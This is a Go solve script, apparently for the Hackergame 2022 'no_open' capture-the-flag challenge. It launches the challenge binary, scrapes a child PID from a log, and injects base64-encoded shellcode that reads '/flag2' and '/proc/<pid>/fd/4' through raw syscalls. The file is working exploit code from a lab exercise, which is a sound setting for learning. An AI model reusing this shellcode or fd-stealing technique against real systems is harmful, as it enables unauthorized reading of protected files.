package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"time"
)

func main() {
	// subProcess := exec.Command("/home/v1me/workspace/hackergame2022-challenges/no_open/files/bin/chall") //Just for testing, replace with your subProcess
	subProcess := exec.Command("/chall") //Just for testing, replace with your subProcess

	stdin, err := subProcess.StdinPipe()
	if err != nil {
		fmt.Println(err)
	}
	defer stdin.Close()

	subProcess.Stdout = os.Stdout
	subProcess.Stderr = os.Stderr

	fmt.Println("START")
	if err = subProcess.Start(); err != nil {
		fmt.Println("An error occured: ", err)
	}

	stdin.Write([]byte("flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}\n"))
	// io.WriteString(stdin, "flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}\n")
	fmt.Println("write flag")

	time.Sleep(1 * time.Second)
	logfile, open_err := os.OpenFile("/tmp/log", os.O_RDONLY|os.O_APPEND, 0666)
	if open_err != nil {
		fmt.Println("open file error")
	}
	defer logfile.Close()

	content := make([]byte, 1024)
	logfile.Read(content)

	r, reg_compile_err := regexp.Compile("Child pid ([0-9]+)")
	if reg_compile_err != nil {
		fmt.Println("reg compile error")
	}
	pid := r.FindStringSubmatch(string(content))[1]
	fmt.Println("pid: ", pid)

	// sc_b64 := "SMfArAEAAEjHx5z///9IjTVSAAAASDHSDwVIx8ACAAAASI09SgAAAEgx9g8FSInHSMfAAAAAAEiNNY0AAABIx8IAAQAADwVIx8ABAAAASMfHAQAAAEiNNW8AAABIx8IAAQAADwXr/i90bXAvZmxhZzIA"
	sc_b64 := "SMfArAEAAEjHx5z///9IjTVSAAAASDHSDwVIx8ACAAAASI09RgAAAEgx9g8FSInHSMfAAAAAAEiNNY0AAABIx8IAAQAADwVIx8ABAAAASMfHAQAAAEiNNW8AAABIx8IAAQAADwXr/i9mbGFnMgA="

	sc, _ := base64.StdEncoding.DecodeString(sc_b64)

	sc = append(sc, []byte("/proc/")...)
	sc = append(sc, []byte(pid)...)
	sc = append(sc, []byte("/fd/4\x00")...)

	fmt.Println("sc: ", sc)

	stdin.Write(sc)

	subProcess.Wait()
	fmt.Println("END")
}
